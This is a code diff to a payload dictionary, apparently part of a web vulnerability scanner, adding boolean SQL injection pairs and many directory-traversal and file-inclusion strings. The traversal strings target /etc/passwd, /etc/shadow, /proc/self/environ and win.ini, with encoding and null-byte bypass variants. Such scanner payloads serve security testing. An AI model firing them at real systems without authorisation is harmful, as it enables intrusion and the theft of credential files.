@@ -46,12 +46,85 @@ PAYLOAD_DB: Dict[str, List[str]] = {
         "' OR 'x'='x",
     ],
 
+    # Boolean-based SQL injection - TRUE conditions (should return normal/more results)
+    "sqli_boolean_true": [
+        "' AND '1'='1",
+        "1' AND '1'='1",
+        "' AND 1=1 -- ",
+        "1 AND 1=1",
+        "' OR '1'='1",
+        "admin' OR 'x'='x",
+    ],
+
+    # Boolean-based SQL injection - FALSE conditions (should return no/fewer results)
+    "sqli_boolean_false": [
+        "' AND '1'='2",
+        "1' AND '1'='2",
+        "' AND 1=2 -- ",
+        "1 AND 1=2",
+        "' OR '1'='2",
+        "admin' AND '1'='2",
+    ],
+
     # Directory traversal probes (trying to reach sensitive files)
     "dir_traversal": [
-        "../",  # relative traversal
+        "../",  # relative traversal - basic
         "..\\",  # windows style
         "../../etc/passwd",
-        "..%2F..%2Fetc%2Fpasswd",
+        "../../../../etc/passwd",
+        "../../../../../etc/passwd",
+        "../../../../../../etc/passwd",
+        "..%2F..%2F..%2Fetc%2Fpasswd",
+        "..%252F..%252F..%252Fetc%252Fpasswd",
+        "....//....//....//etc/passwd",
+        "../../etc/shadow",
+        "../../../../etc/shadow",
+        "../../../../../etc/shadow",
+        "../../../etc/hosts",
+        "../../../proc/self/environ",
+        "../../../proc/version",
+        "../../../../proc/version",
+        # Windows traversal
+        "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+        "..\\..\\..\\..\\windows\\win.ini",
+        "..\\..\\..\\..\\winnt\\win.ini",
+        "..%5C..%5C..%5Cwindows%5Cwin.ini",
+    ],
+    
+    # LFI specific payloads for query parameters
+    "lfi": [
+        "../../../etc/passwd",
+        "../../../../etc/passwd",
+        "../../../../../etc/passwd",
+        "../../../../../../etc/passwd",
+        "../../../../../../../etc/passwd",
+        "..%2F..%2F..%2Fetc%2Fpasswd",
+        "..%252F..%252F..%252Fetc%252Fpasswd",
+        "....//....//....//etc/passwd",
+        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+        "..\\/..\\/..\\/etc/passwd",
+        "../../etc/shadow",
+        "../../../../etc/shadow",
+        "../../../../../../etc/shadow",
+        "../../etc/hosts",
+        "../../../etc/hosts",
+        "../../../../etc/hosts",
+        "../../../proc/self/environ",
+        "../../../proc/self/cmdline",
+        "../../../proc/version",
+        "../../../../proc/version",
+        "../../../../../proc/version",
+        # Windows
+        "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+        "..\\..\\..\\..\\windows\\win.ini",
+        "..\\..\\..\\..\\winnt\\win.ini",
+        "..\\..\\..\\..\\..\\windows\\win.ini",
+        "..%5C..%5C..%5Cwindows%5Cwin.ini",
+        "..%255c..%255c..%255cwindows%255cwin.ini",
+        # Null byte bypass
+        "../../etc/passwd%00.jpg",
+        "../../etc/passwd\x00.png",
+        "..\\..\\windows\\win.ini%00.txt",
     ],
 
     # Open redirect probes that point to a harmless, controlled domain
